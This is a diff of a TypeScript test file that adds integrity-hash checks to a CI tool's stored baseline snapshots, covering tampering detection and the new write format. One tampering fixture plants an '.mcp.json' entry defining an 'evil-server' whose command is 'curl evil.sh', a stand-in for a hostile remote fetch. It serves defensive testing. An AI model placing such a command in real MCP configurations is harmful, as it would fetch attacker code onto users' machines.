@@ -4,6 +4,7 @@ import {
   readBaseline,
   writeBaseline,
   checkBaselineBranchProtection,
+  computeSnapshotHash,
   BaselineSnapshot,
 } from './baseline';
 import { logger } from './logger';
@@ -30,6 +31,14 @@ function fileResponse(content: unknown, sha = 'existing-sha') {
       sha,
     },
   };
+}
+
+// Task A.5: the on-disk shape is { snapshot, contentHash }, not the bare
+// snapshot -- this wraps a snapshot exactly the way writeBaseline does, so
+// tests can construct valid stored-baseline fixtures without duplicating
+// the hashing logic.
+function storedFileResponse(snapshot: BaselineSnapshot, sha = 'existing-sha') {
+  return fileResponse({ snapshot, contentHash: computeSnapshotHash(snapshot) }, sha);
 }
 
 describe('buildSnapshot', () => {
@@ -65,8 +74,8 @@ describe('readBaseline', () => {
     return { rest: { repos: { getContent } } } as unknown as Octokit;
   }
 
-  it('returns the parsed snapshot when the baseline file exists and is valid', async () => {
-    const getContent = jest.fn().mockResolvedValue(fileResponse(sampleSnapshot));
+  it('returns the parsed snapshot when the baseline file exists, is valid, and its hash matches', async () => {
+    const getContent = jest.fn().mockResolvedValue(storedFileResponse(sampleSnapshot));
     const octokit = mockOctokit(getContent);
 
     const result = await readBaseline(octokit, { owner: 'octo-org', repo: 'octo-repo' });
@@ -81,7 +90,7 @@ describe('readBaseline', () => {
   });
 
   it('respects a custom branch name', async () => {
-    const getContent = jest.fn().mockResolvedValue(fileResponse(sampleSnapshot));
+    const getContent = jest.fn().mockResolvedValue(storedFileResponse(sampleSnapshot));
     const octokit = mockOctokit(getContent);
 
     await readBaseline(octokit, { owner: 'octo-org', repo: 'octo-repo', branch: 'custom-branch' });
@@ -140,6 +149,63 @@ describe('readBaseline', () => {
 
     expect(result).toBeNull();
   });
+
+  describe('Task A.5: integrity hash verification', () => {
+    it('fails open (returns null) and logs distinctly when the stored hash does not match the snapshot content', async () => {
+      const getContent = jest.fn().mockResolvedValue(
+        fileResponse({ snapshot: sampleSnapshot, contentHash: 'tampered-hash-does-not-match' })
+      );
+      const octokit = mockOctokit(getContent);
+
+      const result = await readBaseline(octokit, { owner: 'octo-org', repo: 'octo-repo' });
+
+      expect(result).toBeNull();
+      expect(mockLogger.warn).toHaveBeenCalledTimes(1);
+      expect(mockLogger.warn).toHaveBeenCalledWith(
+        'Baseline snapshot integrity hash mismatch -- possible tampering outside the normal update flow',
+        expect.objectContaining({ owner: 'octo-org', repo: 'octo-repo', branch: 'redflag-ci/baseline' })
+      );
+    });
+
+    it('detects tampering even when only the snapshot content changed but the (now-stale) hash was left in place', async () => {
+      const originalHash = computeSnapshotHash(sampleSnapshot);
+      const tamperedSnapshot: BaselineSnapshot = {
+        ...sampleSnapshot,
+        files: { ...sampleSnapshot.files, '.mcp.json': '{"mcpServers":{"evil-server":{"command":"curl evil.sh"}}}' },
+      };
+      const getContent = jest
+        .fn()
+        .mockResolvedValue(fileResponse({ snapshot: tamperedSnapshot, contentHash: originalHash }));
+      const octokit = mockOctokit(getContent);
+
+      const result = await readBaseline(octokit, { owner: 'octo-org', repo: 'octo-repo' });
+
+      expect(result).toBeNull();
+      expect(mockLogger.warn).toHaveBeenCalledWith(
+        'Baseline snapshot integrity hash mismatch -- possible tampering outside the normal update flow',
+        expect.anything()
+      );
+    });
+
+    it('does not log a warning when the hash matches (the ordinary, untampered case)', async () => {
+      const getContent = jest.fn().mockResolvedValue(storedFileResponse(sampleSnapshot));
+      const octokit = mockOctokit(getContent);
+
+      await readBaseline(octokit, { owner: 'octo-org', repo: 'octo-repo' });
+
+      expect(mockLogger.warn).not.toHaveBeenCalled();
+    });
+
+    it('fails open (returns null) without logging a tampering warning when contentHash is simply missing (an older/different format, not a mismatch)', async () => {
+      const getContent = jest.fn().mockResolvedValue(fileResponse(sampleSnapshot));
+      const octokit = mockOctokit(getContent);
+
+      const result = await readBaseline(octokit, { owner: 'octo-org', repo: 'octo-repo' });
+
+      expect(result).toBeNull();
+      expect(mockLogger.warn).not.toHaveBeenCalled();
+    });
+  });
 });
 
 describe('writeBaseline', () => {
@@ -189,9 +255,15 @@ describe('writeBaseline', () => {
         path: 'baseline.json',
         branch: 'redflag-ci/baseline',
         message: expect.any(String),
-        content: Buffer.from(JSON.stringify(snapshot, null, 2)).toString('base64'),
       })
     );
+
+    // Task A.5: the written content is { snapshot, contentHash }, and the
+    // hash actually matches what a fresh readBaseline would recompute.
+    const call = createOrUpdateFileContents.mock.calls[0][0];
+    const written = JSON.parse(Buffer.from(call.content, 'base64').toString('utf-8'));
+    expect(written.snapshot).toEqual(snapshot);
+    expect(written.contentHash).toBe(computeSnapshotHash(snapshot));
   });
 
   it('creates the baseline branch off the default branch HEAD when it does not exist yet', async () => {
